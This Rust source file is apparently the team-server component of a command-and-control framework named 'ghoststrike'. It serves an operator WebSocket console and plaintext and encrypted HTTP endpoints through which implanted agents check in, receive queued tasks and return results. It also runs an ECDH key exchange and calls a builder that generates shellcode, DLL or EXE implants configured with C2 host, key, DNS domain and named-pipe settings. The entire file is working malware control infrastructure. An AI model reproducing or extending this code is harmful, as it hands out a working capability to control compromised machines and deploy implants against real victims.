/// Operator WebSocket endpoint + agent HTTP API, running on the same Axum router.
use std::net::SocketAddr;

use axum::{
    extract::{
        ws::{Message, WebSocket, WebSocketUpgrade},
        State,
    },
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use futures::{SinkExt, StreamExt};
use tracing::{info, warn};
use uuid::Uuid;

use ghoststrike_common::{
    decrypt, encrypt, x25519_session_key,
    AgentCheckinReq, AgentCheckinResp, EncryptedEnvelope, KeyExchangeReq,
    OperatorMsg, SessionKey, TaskResultReq,
};

use crate::{
    config::ServerConfig,
    listeners,
    state::SharedState,
};

pub async fn serve(state: SharedState, cfg: &ServerConfig) -> anyhow::Result<()> {
    let app = Router::new()
        // Operator WebSocket
        .route("/ws", get(operator_ws_handler))
        // Agent HTTP API — plaintext
        .route("/api/checkin",        post(agent_checkin))
        .route("/api/taskresult",     post(agent_task_result))
        // ECDH key exchange
        .route("/api/keyex",          post(agent_keyex))
        // Agent HTTP API — AES-GCM encrypted (session key from ECDH or static c2_key)
        .route("/api/checkin/enc",    post(agent_checkin_enc))
        .route("/api/taskresult/enc", post(agent_task_result_enc))
        .with_state(state.clone());

    let addr: SocketAddr = format!("{}:{}", cfg.bind_host, cfg.operator_port).parse()?;
    info!("Operator + Agent API listening on {addr}");

    let listener = tokio::net::TcpListener::bind(addr).await?;
    axum::serve(listener, app).await?;
    Ok(())
}

// ── Operator WebSocket ────────────────────────────────────────────────────────

async fn operator_ws_handler(
    ws: WebSocketUpgrade,
    State(state): State<SharedState>,
) -> impl IntoResponse {
    ws.on_upgrade(|socket| operator_session(socket, state))
}

async fn operator_session(socket: WebSocket, state: SharedState) {
    let (mut tx, mut rx) = socket.split();
    let mut broadcast_rx = state.subscribe();
    let mut authed = false;
    let mut operator_name = String::from("unknown");

    loop {
        tokio::select! {
            msg = rx.next() => {
                let msg = match msg {
                    Some(Ok(m)) => m,
                    _ => break,
                };
                let text = match msg {
                    Message::Text(t) => t.to_string(),
                    Message::Close(_) => break,
                    _ => continue,
                };
                let op_msg: OperatorMsg = match serde_json::from_str(&text) {
                    Ok(m) => m,
                    Err(e) => {
                        let err = OperatorMsg::Error { message: e.to_string() };
                        let _ = tx.send(Message::Text(serde_json::to_string(&err).unwrap().into())).await;
                        continue;
                    }
                };

                if !authed {
                    if let OperatorMsg::Auth { password } = &op_msg {
                        if *password == state.config.password {
                            authed = true;
                            operator_name = format!("op-{}", &Uuid::new_v4().to_string()[..8]);
                            let reply = OperatorMsg::AuthOk {
                                operator_id: Uuid::new_v4(),
                                server_name: state.config.server_name.clone(),
                            };
                            let _ = tx.send(Message::Text(serde_json::to_string(&reply).unwrap().into())).await;
                            info!("Operator authenticated: {operator_name}");
                            let _ = state.broadcast.send(OperatorMsg::OperatorJoined {
                                name: operator_name.clone(),
                            });
                        } else {
                            let reply = OperatorMsg::AuthFail { reason: "Bad password".into() };
                            let _ = tx.send(Message::Text(serde_json::to_string(&reply).unwrap().into())).await;
                        }
                    }
                    continue;
                }

                handle_operator_msg(op_msg, &state, &mut tx).await;
            }

            bcast = broadcast_rx.recv() => {
                if let Ok(msg) = bcast {
                    if let Ok(json) = serde_json::to_string(&msg) {
                        if tx.send(Message::Text(json.into())).await.is_err() {
                            break;
                        }
                    }
                }
            }
        }
    }

    info!("Operator disconnected: {operator_name}");
    let _ = state.broadcast.send(OperatorMsg::OperatorLeft { name: operator_name });
}

async fn handle_operator_msg(
    msg: OperatorMsg,
    state: &SharedState,
    tx: &mut futures::stream::SplitSink<WebSocket, Message>,
) {
    match msg {
        OperatorMsg::ListAgents => {
            let agents = state.list_agents().await;
            let reply = OperatorMsg::AgentList { agents };
            send_msg(tx, reply).await;
        }

        OperatorMsg::ListListeners => {
            let list = state.list_listeners().await;
            let reply = OperatorMsg::ListenerList { listeners: list };
            send_msg(tx, reply).await;
        }

        OperatorMsg::StartListener { config } => {
            match listeners::start(state.clone(), config).await {
                Ok(cfg) => send_msg(tx, OperatorMsg::ListenerStarted { config: cfg }).await,
                Err(e)  => send_msg(tx, OperatorMsg::Error { message: e.to_string() }).await,
            }
        }

        OperatorMsg::StopListener { id } => {
            match listeners::stop(state.clone(), id).await {
                Ok(_)  => send_msg(tx, OperatorMsg::ListenerStopped { id }).await,
                Err(e) => send_msg(tx, OperatorMsg::Error { message: e.to_string() }).await,
            }
        }

        OperatorMsg::TaskAgent { task } => {
            state.queue_task(task.clone()).await;
            info!("Task {} queued for agent {}", task.id, task.agent_id);
        }

        OperatorMsg::BuildPayload { mut config } => {
            // Inject server pubkey so agent can do ECDH handshake.
            config.server_pubkey = hex::encode(state.server_pub);
            // If no static c2_key, the agent will use ECDH-derived session key.
            let broadcast = state.broadcast.clone();
            tokio::spawn(async move {
                match run_builder(config).await {
                    Ok((build_id, bytes, fmt)) => {
                        let _ = broadcast.send(OperatorMsg::BuildReady {
                            build_id,
                            bytes,
                            format: fmt,
                        });
                    }
                    Err(e) => {
                        let _ = broadcast.send(OperatorMsg::BuildError {
                            reason: e.to_string(),
                        });
                    }
                }
            });
        }

        _ => {
            warn!("Unhandled operator message variant");
        }
    }
}

async fn send_msg(
    tx: &mut futures::stream::SplitSink<WebSocket, Message>,
    msg: OperatorMsg,
) {
    if let Ok(json) = serde_json::to_string(&msg) {
        let _ = tx.send(Message::Text(json.into())).await;
    }
}

// ── Agent HTTP API ────────────────────────────────────────────────────────────

async fn agent_checkin(
    State(state): State<SharedState>,
    Json(req): Json<AgentCheckinReq>,
) -> Json<AgentCheckinResp> {
    state.upsert_agent(req.info).await;
    let tasks = state.pending_tasks_for(req.agent_id).await;
    let (sleep_ms, jitter_pct) = {
        let agents = state.agents.read().await;
        agents
            .get(&req.agent_id)
            .map(|a| (a.sleep_ms, a.jitter_pct))
            .unwrap_or((5000, 10))
    };
    Json(AgentCheckinResp { tasks, sleep_ms, jitter_pct })
}

async fn agent_task_result(
    State(state): State<SharedState>,
    Json(req): Json<TaskResultReq>,
) -> Json<serde_json::Value> {
    state
        .update_task_result(req.agent_id, req.task_id, req.output, req.success)
        .await;
    Json(serde_json::json!({ "ok": true }))
}

// ── Encrypted routes ──────────────────────────────────────────────────────────

fn server_session_key(state: &SharedState) -> Option<SessionKey> {
    let hex = &state.config.c2_key;
    if hex.is_empty() { return None; }
    let raw = hex::decode(hex).ok()?;
    SessionKey::from_bytes(&raw).ok()
}

async fn agent_checkin_enc(
    State(state): State<SharedState>,
    Json(env): Json<EncryptedEnvelope>,
) -> Json<serde_json::Value> {
    let key = match agent_session_key(&state, env.agent_id).await {
        Some(k) => k,
        None    => return Json(serde_json::json!({ "error": "no session key for agent" })),
    };
    let mut data = env.nonce.clone();
    data.extend_from_slice(&env.ciphertext);
    let plain = match decrypt(&key, &data) {
        Ok(p) => p,
        Err(e) => return Json(serde_json::json!({ "error": e.to_string() })),
    };
    let req: AgentCheckinReq = match serde_json::from_slice(&plain) {
        Ok(r) => r,
        Err(e) => return Json(serde_json::json!({ "error": e.to_string() })),
    };

    state.upsert_agent(req.info).await;
    let tasks = state.pending_tasks_for(req.agent_id).await;
    let (sleep_ms, jitter_pct) = {
        let agents = state.agents.read().await;
        agents
            .get(&req.agent_id)
            .map(|a| (a.sleep_ms, a.jitter_pct))
            .unwrap_or((5000, 10))
    };
    let resp = AgentCheckinResp { tasks, sleep_ms, jitter_pct };

    let resp_bytes = match serde_json::to_vec(&resp) {
        Ok(b) => b,
        Err(e) => return Json(serde_json::json!({ "error": e.to_string() })),
    };
    let ct = match encrypt(&key, &resp_bytes) {
        Ok(c) => c,
        Err(e) => return Json(serde_json::json!({ "error": e.to_string() })),
    };
    let (nonce, ciphertext) = ct.split_at(12);
    let resp_env = EncryptedEnvelope {
        agent_id:   req.agent_id,
        nonce:      nonce.to_vec(),
        ciphertext: ciphertext.to_vec(),
    };
    Json(serde_json::to_value(&resp_env).unwrap_or_default())
}

async fn agent_task_result_enc(
    State(state): State<SharedState>,
    Json(env): Json<EncryptedEnvelope>,
) -> Json<serde_json::Value> {
    let key = match agent_session_key(&state, env.agent_id).await {
        Some(k) => k,
        None    => return Json(serde_json::json!({ "error": "no session key for agent" })),
    };
    let mut data = env.nonce.clone();
    data.extend_from_slice(&env.ciphertext);
    let plain = match decrypt(&key, &data) {
        Ok(p) => p,
        Err(e) => return Json(serde_json::json!({ "error": e.to_string() })),
    };
    let req: TaskResultReq = match serde_json::from_slice(&plain) {
        Ok(r) => r,
        Err(e) => return Json(serde_json::json!({ "error": e.to_string() })),
    };
    state
        .update_task_result(req.agent_id, req.task_id, req.output, req.success)
        .await;
    Json(serde_json::json!({ "ok": true }))
}

// ── ECDH key exchange ─────────────────────────────────────────────────────────

async fn agent_keyex(
    State(state): State<SharedState>,
    Json(req): Json<KeyExchangeReq>,
) -> Json<serde_json::Value> {
    match x25519_session_key(state.server_priv, &req.agent_pubkey) {
        Ok(key) => {
            state.agent_keys.write().await.insert(req.agent_id, key);
            info!("ECDH key exchange complete for agent {}", req.agent_id);
            Json(serde_json::json!({ "ok": true }))
        }
        Err(e) => Json(serde_json::json!({ "error": e.to_string() })),
    }
}

/// Get the session key for an agent: prefer ECDH-derived, fall back to static c2_key.
async fn agent_session_key(state: &SharedState, agent_id: Uuid) -> Option<SessionKey> {
    if let Some(k) = state.agent_keys.read().await.get(&agent_id).cloned() {
        return Some(k);
    }
    server_session_key(state)
}

// ── Builder invocation ────────────────────────────────────────────────────────

async fn run_builder(
    cfg: ghoststrike_common::BuildConfig,
) -> anyhow::Result<(String, Vec<u8>, ghoststrike_common::PayloadFormat)> {
    use tokio::process::Command;

    let output_path = cfg.output_path.clone()
        .unwrap_or_else(|| format!("/tmp/gs_payload_{}.exe", uuid::Uuid::new_v4()));

    let format_str = match cfg.format {
        ghoststrike_common::PayloadFormat::Shellcode => "shellcode",
        ghoststrike_common::PayloadFormat::Dll       => "dll",
        _                                            => "exe",
    };

    let mut cmd = Command::new("ghoststrike-builder");
    cmd.arg("--host")        .arg(&cfg.c2_host)
       .arg("--port")        .arg(cfg.c2_port.to_string())
       .arg("--protocol")    .arg(format!("{:?}", cfg.protocol).to_lowercase())
       .arg("--listener-id") .arg(cfg.listener_id.to_string())
       .arg("--sleep-ms")    .arg(cfg.sleep_ms.to_string())
       .arg("--jitter-pct")  .arg(cfg.jitter_pct.to_string())
       .arg("--format")      .arg(format_str)
       .arg("--output")      .arg(&output_path);

    if !cfg.c2_key.is_empty() {
        cmd.arg("--c2-key").arg(&cfg.c2_key);
    }
    if !cfg.server_pubkey.is_empty() {
        cmd.arg("--server-pubkey").arg(&cfg.server_pubkey);
    }
    if let Some(ref d) = cfg.dns_domain {
        cmd.arg("--dns-domain").arg(d);
    }
    if let Some(ref p) = cfg.pipe_name {
        cmd.arg("--pipe-name").arg(p);
    }

    let out = cmd.output().await?;
    if !out.status.success() {
        let stderr = String::from_utf8_lossy(&out.stderr);
        return Err(anyhow::anyhow!("builder failed: {stderr}"));
    }

    // Parse build_id from stdout (last line: "[+] Build complete: … (build_id: <uuid>)")
    let stdout = String::from_utf8_lossy(&out.stdout);
    let build_id = stdout
        .lines()
        .rev()
        .find(|l| l.contains("build_id"))
        .and_then(|l| l.split("build_id: ").nth(1))
        .map(|s| s.trim_end_matches(')').trim().to_string())
        .unwrap_or_else(|| uuid::Uuid::new_v4().to_string());

    let bytes = tokio::fs::read(&output_path).await?;
    Ok((build_id, bytes, cfg.format))
}
